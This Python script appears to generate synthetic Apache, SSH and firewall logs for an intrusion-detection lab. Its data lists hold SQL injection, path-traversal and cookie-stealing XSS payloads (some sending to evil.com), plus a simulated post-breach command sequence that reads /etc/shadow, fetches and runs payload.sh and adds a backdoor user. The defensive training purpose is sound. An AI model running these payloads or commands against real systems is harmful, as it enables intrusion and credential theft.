"""
generate_logs.py
================
Programmatically regenerates the three log files used in the intrusion
detection demo.  Running this script is useful when you want fresh data
with a different random seed or a different date range.

Usage
-----
    python generate_logs.py                  # default: seed=42, 3 days
    python generate_logs.py --seed 99        # reproducible but different set
    python generate_logs.py --seed 7 --days 5

Log-format quick reference
---------------------------
Apache Combined Log Format field order:
  %h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"
  Where:
    %h  = client IP address
    %l  = ident (always "-" in practice)
    %u  = authenticated user ("-" if none)
    %t  = [day/Month/year:HH:MM:SS +offset]
    %r  = first line of request: "METHOD /path HTTP/version"
    %>s = final HTTP status code
    %b  = bytes sent (body only, "-" if zero)
    %{Referer}i   = Referer header
    %{User-Agent}i = User-Agent header

Linux syslog SSH auth format:
  Month DD HH:MM:SS hostname service[pid]: message
  Common message types:
    "Accepted publickey for <user> from <ip> port <port> ssh2: RSA SHA256:..."
    "Accepted password for <user> from <ip> port <port> ssh2"
    "Failed password for [invalid user] <user> from <ip> port <port> ssh2"
    "pam_unix(sshd:session): session opened/closed for user <user>"
    "sudo: <user> : TTY=... ; COMMAND=..."

iptables / netfilter kernel log format (one line per dropped packet):
  Month DD HH:MM:SS hostname kernel: [uptime.frac] PREFIX IN=iface OUT= MAC=...
    SRC=<src_ip> DST=<dst_ip> LEN=<pkt_len> TOS=0x00 PREC=0x00 TTL=<ttl>
    ID=<id> PROTO=TCP|UDP SPT=<src_port> DPT=<dst_port>
    WINDOW=<win> RES=0x00 SYN URGP=0
"""

import argparse
import os
import random
from datetime import datetime, timedelta

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
OUTPUT_DIR = os.path.join(os.path.dirname(__file__), "data")

# Legitimate client IP addresses
LEGIT_IPS = [
    "10.0.1.50", "10.0.1.51", "10.0.1.52",
    "192.168.100.10",
    "46.101.93.64", "104.21.45.67", "172.67.134.21",
]

# All attacker IPs are from RFC 5737 documentation ranges (non-routable test
# addresses) so they can never accidentally match a real host.
ATTACKER_NIKTO      = "198.51.100.23"   # Nikto scanner
ATTACKER_SQLI       = "203.0.113.17"    # sqlmap
ATTACKER_TRAVERSAL  = "203.0.113.99"    # path traversal
ATTACKER_FLOOD      = "198.51.100.77"   # HTTP flood
ATTACKER_XSS        = "203.0.113.55"    # XSS probes
ATTACKER_BRUTEFORCE = "203.0.113.42"    # SSH brute force
ATTACKER_PORTSCAN   = "198.51.100.55"   # port scanner
ATTACKER_SSHSCAN    = "192.0.2.88"      # SSH scanner (firewall)
MISC_DROPPERS = [
    "203.0.113.200", "198.51.100.100", "192.0.2.50", "203.0.113.150",
    "198.51.100.200", "192.0.2.75",    "203.0.113.220","198.51.100.150",
    "192.0.2.100",   "203.0.113.175",  "198.51.100.75","192.0.2.25",
    "203.0.113.50",  "198.51.100.125", "192.0.2.150",  "203.0.113.80",
    "198.51.100.225","192.0.2.200",    "203.0.113.125","198.51.100.50",
]

# Realistic browser User-Agent strings
BROWSER_UAS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0',
    'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
]

# Normal web endpoints
NORMAL_ENDPOINTS = [
    ("GET",  "/",                    200, 4523),
    ("GET",  "/products",            200, 8921),
    ("GET",  "/about",               200, 3201),
    ("GET",  "/dashboard",           200, 9874),
    ("GET",  "/cart",                200, 5643),
    ("GET",  "/api/v1/orders",       200, 7823),
    ("GET",  "/static/css/main.css", 304, 0),
    ("GET",  "/static/css/main.css", 200, 45231),
    ("GET",  "/favicon.ico",         200, 1150),
    ("POST", "/login",               200, 512),
    ("POST", "/checkout",            200, 2341),
    ("GET",  "/nonexistent",         404, 512),
    ("POST", "/login",               301, 0),
]

# Nikto probe paths (scanner UA changes per request)
NIKTO_PATHS = [
    "/cgi-bin/test.cgi", "/cgi-bin/printenv", "/.env", "/admin",
    "/wp-admin", "/phpinfo.php", "/.git/config", "/backup.sql",
    "/server-status", "/cgi-bin/test-cgi", "/phpmyadmin", "/config.php",
    "/wp-config.php", "/.htaccess", "/robots.txt", "/crossdomain.xml",
    "/sitemap.xml", "/etc/passwd", "/admin/config", "/cgi-bin/status",
    "/.svn/entries",
]

# sqlmap payloads — realistic SQLi probes
SQLI_URIS = [
    "/products.php?id=1'",
    "/products.php?id=1%20AND%201=1",
    "/products.php?id=1%20AND%201=2",
    "/products.php?id=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--",
    "/products.php?id=1%20UNION%20SELECT%201%2C2%2C3--",
    "/login?user=admin'--&pass=x",
    "/api/users?filter=1%20OR%201%3D1",
    "/search?q=%27%20OR%20%271%27%3D%271",
    "/products.php?id=1%27%20AND%20SLEEP(5)--",
    "/products.php?id=1%3B%20DROP%20TABLE%20users--",
    "/api/v1/orders?id=1%27%20UNION%20SELECT%20NULL%2CNULL--",
    "/products.php?cat=1%20AND%20EXTRACTVALUE(1%2CCONCAT(0x7e%2C(SELECT%20version())))--",
    "/products.php?id=1%20ORDER%20BY%201--",
    "/products.php?id=1%20ORDER%20BY%205--",
    "/products.php?id=1%20ORDER%20BY%204--",
    "/products.php?id=-1%20UNION%20SELECT%20table_name%2CNULL%2CNULL%2CNULL%20FROM%20information_schema.tables--",
    "/products.php?id=-1%20UNION%20SELECT%20column_name%2CNULL%2CNULL%2CNULL%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27users%27--",
    "/checkout?promo=1%27%3BINSERT%20INTO%20admins%20VALUES%28%27hacked%27%2C%27password%27%29--",
    "/api/users?id=1%20AND%20(SELECT%20SUBSTR(username%2C1%2C1)%20FROM%20users%20LIMIT%201)%3D%27a%27--",
    "/api/users?id=1%20AND%20(SELECT%20SUBSTR(username%2C1%2C1)%20FROM%20users%20LIMIT%201)%3D%27b%27--",
    "/search?q=test%27%20OR%20%271%27%3D%271%27%23",
    "/products.php?id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))a)",
    "/dashboard?user=1%27%20exec%20xp_cmdshell(%27whoami%27)--",
    "/api/v1/orders?sort=id%3BSELECT%20pg_sleep(5)--",
]

# Path traversal payloads
TRAVERSAL_URIS = [
    "/download?file=../../../../etc/passwd",
    "/%2e%2e/%2e%2e/etc/shadow",
    "/static/../../../etc/hosts",
    "/images/../../../../proc/self/environ",
    "/download?file=..%2F..%2F..%2Fetc%2Fpasswd",
    "/files?path=....//....//etc/passwd",
    "/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/api/file?name=..%5C..%5C..%5Cwindows%5Cwin.ini",
    "/images/..%2F..%2F..%2F..%2Fetc%2Fshadow",
    "/static/%2e%2e/%2e%2e/%2e%2e/etc/mysql/my.cnf",
    "/download?file=....%2F....%2F....%2Fetc%2Fpasswd",
    "/upload?dest=..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php",
    "/download?file=..%2F..%2F..%2F..%2Fetc%2Fhosts",
    "/images/../../../boot.ini",
    "/static/..%2F..%2F..%2Fproc%2Fself%2Fcmdline",
]

# XSS payloads
XSS_URIS = [
    "/search?q=<script>alert(1)</script>",
    "/comment?text=<img src=x onerror=alert(document.cookie)>",
    "/profile?name=%3Cscript%3Ealert%28xss%29%3C%2Fscript%3E",
    "/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>",
    "/feedback?msg=<svg/onload=alert(1)>",
    "/search?q=%3Cimg+src%3Dx+onerror%3Dalert%28document.cookie%29%3E",
    "/profile?bio=javascript:alert('xss')",
    "/search?q=<body+onload=alert(1)>",
    "/comment?text=%3Cscript+src%3D%22https%3A%2F%2Fevil.com%2Fxss.js%22%3E%3C%2Fscript%3E",
    "/profile?name=<script>fetch('https://evil.com/steal?k='+btoa(document.cookie))</script>",
]

# Brute-force username list (cycles through these)
BRUTE_USERS = [
    "root", "admin", "ubuntu", "pi", "postgres", "oracle", "test",
    "guest", "operator", "user", "deploy", "ftpuser", "git", "jenkins",
    "mysql", "nagios", "tomcat", "www-data",
]

# Ports probed during port scan (same as the static log)
PORT_SCAN_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
    1433, 1521, 2181, 2375, 3000, 3306, 3389, 4444, 5432, 5900,
    6379, 6443, 8080, 8443, 8888, 9200, 9300, 10250,
    27017, 27018, 50070, 50075, 61616,
    2049, 4369, 7001, 9090, 5601,
]

# MAC address header used in all firewall entries
FW_MAC = "00:0c:29:ab:cd:ef:00:50:56:a0:b1:c2:08:00"


# ---------------------------------------------------------------------------
# Helper utilities
# ---------------------------------------------------------------------------

def fmt_apache_ts(dt: datetime) -> str:
    """Format a datetime as Apache Combined Log timestamp."""
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")


def fmt_syslog_ts(dt: datetime) -> str:
    """Format a datetime as syslog month-day-time (no year)."""
    # syslog uses space-padded day: "May  1" vs "May 19"
    day = dt.day
    month_abbr = dt.strftime("%b")
    time_str = dt.strftime("%H:%M:%S")
    return f"{month_abbr} {day:2d} {time_str}"


def fmt_fw_ts(dt: datetime) -> str:
    """Firewall log timestamp is syslog format."""
    return fmt_syslog_ts(dt)


def rand_port(rng: random.Random, lo: int = 32768, hi: int = 65535) -> int:
    """Return a random high (ephemeral) port number."""
    return rng.randint(lo, hi)


def business_hour_dt(rng: random.Random, base_date: datetime) -> datetime:
    """Return a datetime on base_date between 08:00 and 18:00."""
    hour = rng.randint(8, 17)
    minute = rng.randint(0, 59)
    second = rng.randint(0, 59)
    return base_date.replace(hour=hour, minute=minute, second=second)


# ---------------------------------------------------------------------------
# Apache log generator
# ---------------------------------------------------------------------------

def generate_apache_log(rng: random.Random, start_date: datetime, num_days: int) -> list:
    """
    Returns a list of Apache Combined Log Format lines.

    The function creates:
      - Normal traffic spread across business hours (majority of lines)
      - Attack 1: Nikto scanner (day 1, ~11:00)
      - Attack 2: sqlmap SQL injection (day 1, ~14:00)
      - Attack 3: Path traversal (day 2, ~10:30)
      - Attack 4: HTTP flood (day 2, ~16:30)
      - Attack 5: XSS probes (day 3, ~09:15)
    """
    lines = []

    def apache_line(ip, ts, method, uri, status, size, referer="-", ua=None):
        """Build one Combined Log Format line."""
        if ua is None:
            ua = rng.choice(BROWSER_UAS)
        size_str = str(size) if size > 0 else "0"
        return f'{ip} - - [{fmt_apache_ts(ts)}] "{method} {uri} HTTP/1.1" {status} {size_str} "{referer}" "{ua}"'

    # -- Normal traffic (business hours, spread across all days) --
    day0 = start_date
    for day_offset in range(num_days):
        current_day = day0 + timedelta(days=day_offset)
        # 13-15 normal requests per day
        num_requests = rng.randint(13, 15)
        for _ in range(num_requests):
            ts = business_hour_dt(rng, current_day)
            ip = rng.choice(LEGIT_IPS)
            method, path, status, size = rng.choice(NORMAL_ENDPOINTS)
            referer = rng.choice([
                "-", "https://example.com/", "https://example.com/products",
                "https://example.com/cart", "https://www.google.com/",
                "https://www.bing.com/", "https://example.com/dashboard",
                "https://example.com/login",
            ])
            lines.append(apache_line(ip, ts, method, path, status, size, referer))

    # -- Attack 1: Nikto scanner (day 1 around 11:00) --
    # Nikto cycles through test IDs; each uses a slightly different sub-UA
    nikto_start = day0.replace(hour=11, minute=0, second=0)
    for i, path in enumerate(NIKTO_PATHS):
        ts = nikto_start + timedelta(seconds=14 * i)
        test_id = str(340 + i).zfill(6)
        ua = f"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:{test_id})"
        lines.append(apache_line(ATTACKER_NIKTO, ts, "GET", path, 404, 287, "-", ua))

    # -- Attack 2: sqlmap SQL injection (day 1 around 14:00) --
    sqli_start = day0.replace(hour=14, minute=0, second=0)
    sqli_ua = "sqlmap/1.7.8#stable (https://sqlmap.org)"
    # Status alternates 200/500 depending on payload type
    sqli_statuses = [500, 200, 200, 500, 200, 500, 200, 200, 200, 500,
                     500, 500, 200, 500, 200, 200, 200, 500, 200, 200,
                     200, 200, 500, 200]
    for i, uri in enumerate(SQLI_URIS):
        ts = sqli_start + timedelta(seconds=16 * i)
        status = sqli_statuses[i % len(sqli_statuses)]
        size = 1203 if status == 500 else rng.choice([512, 4523, 8921, 45231])
        lines.append(apache_line(ATTACKER_SQLI, ts, "GET", uri, status, size, "-", sqli_ua))

    # -- Attack 3: Path traversal (day 2 around 10:30) --
    day1 = day0 + timedelta(days=1)
    trav_start = day1.replace(hour=10, minute=30, second=0)
    for i, uri in enumerate(TRAVERSAL_URIS):
        ts = trav_start + timedelta(seconds=13 * i)
        status = rng.choice([400, 403])
        lines.append(apache_line(ATTACKER_TRAVERSAL, ts, "GET", uri, status, 512))

    # -- Attack 4: HTTP flood (day 2 at 16:30 — 30 requests in 3 minutes) --
    flood_start = day1.replace(hour=16, minute=30, second=0)
    for i in range(30):
        ts = flood_start + timedelta(seconds=6 * i)  # one request every 6 s
        lines.append(apache_line(ATTACKER_FLOOD, ts, "GET", "/", 200, 4523, "-",
                                 "Go-http-client/1.1"))

    # -- Attack 5: XSS probes (day 3 around 09:15) --
    day2 = day0 + timedelta(days=2)
    xss_start = day2.replace(hour=9, minute=15, second=0)
    for i, uri in enumerate(XSS_URIS):
        ts = xss_start + timedelta(seconds=38 * i)
        lines.append(apache_line(ATTACKER_XSS, ts, "GET", uri, 400, 512))

    # Sort by timestamp so the file is chronologically ordered
    lines.sort(key=lambda x: x.split("[")[1].split("]")[0])
    return lines


# ---------------------------------------------------------------------------
# SSH auth log generator
# ---------------------------------------------------------------------------

def generate_ssh_log(rng: random.Random, start_date: datetime, num_days: int) -> list:
    """
    Returns a list of Linux syslog SSH auth lines.

    Includes:
      - Normal successful logins / session open+close messages
      - SSH brute force from ATTACKER_BRUTEFORCE on night of day 1
      - Post-compromise lateral movement commands
    """
    lines = []
    hostname = "webserver01"
    ssh_users = ["deploy", "admin", "ubuntu", "monitoring"]
    legit_ssh_ips = ["10.0.1.50", "10.0.1.51", "10.0.1.52"]

    def syslog_line(dt, service, pid, msg):
        return f"{fmt_syslog_ts(dt)} {hostname} {service}[{pid}]: {msg}"

    pid_counter = [10100]   # mutable so nested helpers can increment it

    def next_pid():
        pid_counter[0] += 1
        return pid_counter[0]

    # -- Normal logins across all days --
    for day_offset in range(num_days):
        current_day = start_date + timedelta(days=day_offset)
        # 3-4 user sessions per day
        session_times = sorted([
            business_hour_dt(rng, current_day) for _ in range(rng.randint(3, 4))
        ])
        for ts_open in session_times:
            user = rng.choice(ssh_users)
            ip = rng.choice(legit_ssh_ips)
            port = rand_port(rng)
            pid = next_pid()
            auth = rng.choice(["publickey", "password"])
            if auth == "publickey":
                sha = "abc123def456ghi789jkl012mno345pqr678stu901vwx234"
                lines.append(syslog_line(ts_open, "sshd", pid,
                    f"Accepted publickey for {user} from {ip} port {port} ssh2: RSA SHA256:{sha}"))
            else:
                lines.append(syslog_line(ts_open, "sshd", pid,
                    f"Accepted password for {user} from {ip} port {port} ssh2"))
            lines.append(syslog_line(ts_open + timedelta(seconds=1), "sshd", pid,
                f"pam_unix(sshd:session): session opened for user {user} by (uid=0)"))
            # Session closes 30–120 minutes later
            duration = timedelta(minutes=rng.randint(30, 120))
            ts_close = ts_open + duration
            lines.append(syslog_line(ts_close, "sshd", pid,
                f"pam_unix(sshd:session): session closed for user {user}"))

    # -- Brute force: evening of day 1 (23:15 – 23:52) --
    # ~120 failed attempts, then one success, then lateral movement
    day0 = start_date
    bf_start = day0.replace(hour=23, minute=15, second=0)
    attempt_ts = bf_start
    bf_port_base = 52000
    user_cycle = BRUTE_USERS * 8    # enough to cover ~120 attempts

    # Add two "noise" failed attempts just before the burst to add realism
    noise_ts = day0.replace(hour=22, minute=0, second=14)
    lines.append(syslog_line(noise_ts, "sshd", next_pid(),
        f"Failed password for root from 192.168.100.11 port 45000 ssh2"))
    lines.append(syslog_line(noise_ts + timedelta(seconds=18), "sshd", next_pid(),
        f"Failed password for invalid user foobar from 192.168.100.11 port 45001 ssh2"))

    for i in range(120):
        user = user_cycle[i % len(BRUTE_USERS)]
        port = bf_port_base + i
        pid = next_pid()
        lines.append(syslog_line(attempt_ts, "sshd", pid,
            f"Failed password for {user} from {ATTACKER_BRUTEFORCE} port {port} ssh2"))
        attempt_ts += timedelta(seconds=rng.randint(15, 20))

    # The brute force succeeds
    success_ts = day0.replace(hour=23, minute=52, second=7)
    success_pid = next_pid()
    lines.append(syslog_line(success_ts, "sshd", success_pid,
        f"Accepted password for root from {ATTACKER_BRUTEFORCE} port 52198 ssh2"))
    lines.append(syslog_line(success_ts + timedelta(seconds=1), "sshd", success_pid,
        "pam_unix(sshd:session): session opened for user root by (uid=0)"))

    # Post-compromise activity (lateral movement, data exfil commands)
    commands = [
        "/bin/bash",
        "/usr/bin/id",
        "/bin/cat /etc/shadow",
        f"/usr/bin/wget http://{ATTACKER_BRUTEFORCE}/payload.sh",
        "/bin/chmod +x /tmp/payload.sh",
        "/tmp/payload.sh",
        "/usr/sbin/useradd -m backdoor",
        "/bin/cp /etc/passwd /tmp/passwd.bak",
        "/sbin/iptables -F",
        "/usr/bin/crontab -e",
        "/bin/ss -tulpn",
        '/usr/bin/find / -name "*.conf" -readable',
        "/bin/cat /var/www/html/config.php",
        "/usr/bin/mysql -u root -p",
    ]
    cmd_ts = success_ts + timedelta(seconds=3)
    for cmd in commands:
        pid = next_pid()
        lines.append(syslog_line(cmd_ts, "sudo", pid,
            f"    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND={cmd}"))
        cmd_ts += timedelta(seconds=rng.randint(5, 10))

    # Attacker disconnects
    disconnect_ts = cmd_ts + timedelta(seconds=5)
    lines.append(syslog_line(disconnect_ts, "sshd", success_pid,
        f"Received disconnect from {ATTACKER_BRUTEFORCE} port 52198:11: disconnected by user"))

    # Sort chronologically
    lines.sort()
    return lines


# ---------------------------------------------------------------------------
# Firewall log generator
# ---------------------------------------------------------------------------

def generate_firewall_log(rng: random.Random, start_date: datetime, num_days: int) -> list:
    """
    Returns a list of iptables/netfilter kernel log lines.

    Includes:
      - Random background drops across the period
      - Port scan from ATTACKER_PORTSCAN (day 2, ~13:45)
      - Sustained SSH probes from ATTACKER_SSHSCAN (night of day 3 into day 4)
    """
    lines = []
    hostname = "webserver01"
    uptime_base = 12000.0   # arbitrary starting kernel uptime in seconds

    def fw_line(dt, src, dst_port, proto="TCP", ttl=64, pkt_id=None, spt=None):
        """Build one IPTABLES-DROP kernel log line."""
        nonlocal uptime_base
        uptime_base += rng.uniform(100, 5000)
        uptime_str = f"{uptime_base:.6f}"
        if pkt_id is None:
            pkt_id = rng.randint(10000, 99999)
        if spt is None:
            spt = rand_port(rng)
        dst = "10.0.1.100"
        mac = FW_MAC
        proto_extra = "WINDOW=1024 RES=0x00 SYN URGP=0" if proto == "TCP" else "WINDOW=0 RES=0x00 URGP=0"
        return (
            f"{fmt_fw_ts(dt)} {hostname} kernel: [{uptime_str}] "
            f"IPTABLES-DROP IN=eth0 OUT= MAC={mac} "
            f"SRC={src} DST={dst} LEN=40 TOS=0x00 PREC=0x00 TTL={ttl} ID={pkt_id} "
            f"PROTO={proto} SPT={spt} DPT={dst_port} {proto_extra}"
        )

    # -- Miscellaneous background drops (sprinkled across all days) --
    for day_offset in range(num_days):
        current_day = start_date + timedelta(days=day_offset)
        num_drops = rng.randint(6, 8)
        drop_times = sorted([
            current_day + timedelta(hours=rng.uniform(0, 23), minutes=rng.randint(0, 59))
            for _ in range(num_drops)
        ])
        for ts in drop_times:
            src = rng.choice(MISC_DROPPERS)
            port = rng.choice([23, 3389, 1433, 5900, 445, 9200, 8888, 4444,
                               6379, 27017, 2375, 5432, 3306, 6443, 10250])
            proto = rng.choice(["TCP", "TCP", "TCP", "UDP"])
            ttl = rng.choice([33, 44, 51, 55, 60, 64, 78, 86, 99, 110, 112, 120, 122, 128, 236, 241, 243, 245])
            lines.append(fw_line(ts, src, port, proto, ttl))

    # -- Port scan (day 2, 13:45) --
    day1 = start_date + timedelta(days=1)
    scan_start = day1.replace(hour=13, minute=45, second=0)
    scan_ts = scan_start
    for i, port in enumerate(PORT_SCAN_PORTS):
        scan_ts = scan_start + timedelta(seconds=2 * i)
        pkt_id = 54321 + i
        spt = 54321 + i
        # Scanner TTL is 245 — a telltale sign of spoofed/crafted packets
        lines.append(fw_line(scan_ts, ATTACKER_PORTSCAN, port, "TCP", 245, pkt_id, spt))

    # -- SSH scanner (night of day 3, one probe every ~70 minutes) --
    day2 = start_date + timedelta(days=2)
    ssh_scan_start = day2.replace(hour=0, minute=15, second=0)
    for i in range(20):
        ts = ssh_scan_start + timedelta(minutes=rng.randint(60, 80) * i)
        if ts.day > (day2 + timedelta(days=2)).day:
            break
        pkt_id = 60001 + i
        spt = 60001 + i
        lines.append(fw_line(ts, ATTACKER_SSHSCAN, 22, "TCP", 245, pkt_id, spt))

    # Sort by timestamp (syslog format — sort lexicographically works within same month)
    lines.sort()
    return lines


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(
        description="Regenerate demo log files for the intrusion detection lab."
    )
    parser.add_argument(
        "--seed", type=int, default=42,
        help="Random seed for reproducibility (default: 42)"
    )
    parser.add_argument(
        "--days", type=int, default=3,
        help="Number of days to generate (default: 3, starting 2026-05-19)"
    )
    return parser.parse_args()


def main():
    args = parse_args()
    rng = random.Random(args.seed)

    # All logs start on May 19, 2026
    start_date = datetime(2026, 5, 19, 0, 0, 0)

    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # -- Apache access log --
    apache_lines = generate_apache_log(rng, start_date, args.days)
    apache_path = os.path.join(OUTPUT_DIR, "apache_access.log")
    with open(apache_path, "w", encoding="utf-8") as f:
        f.write("\n".join(apache_lines) + "\n")
    print(f"[+] apache_access.log : {len(apache_lines):>5} lines  ->  {apache_path}")

    # -- SSH auth log --
    ssh_lines = generate_ssh_log(rng, start_date, args.days)
    ssh_path = os.path.join(OUTPUT_DIR, "ssh_auth.log")
    with open(ssh_path, "w", encoding="utf-8") as f:
        f.write("\n".join(ssh_lines) + "\n")
    print(f"[+] ssh_auth.log      : {len(ssh_lines):>5} lines  ->  {ssh_path}")

    # -- Firewall log --
    fw_lines = generate_firewall_log(rng, start_date, args.days)
    fw_path = os.path.join(OUTPUT_DIR, "firewall.log")
    with open(fw_path, "w", encoding="utf-8") as f:
        f.write("\n".join(fw_lines) + "\n")
    print(f"[+] firewall.log      : {len(fw_lines):>5} lines  ->  {fw_path}")

    total = len(apache_lines) + len(ssh_lines) + len(fw_lines)
    print(f"\n[✓] Done. {total} total log lines generated (seed={args.seed}, days={args.days}).")


if __name__ == "__main__":
    main()
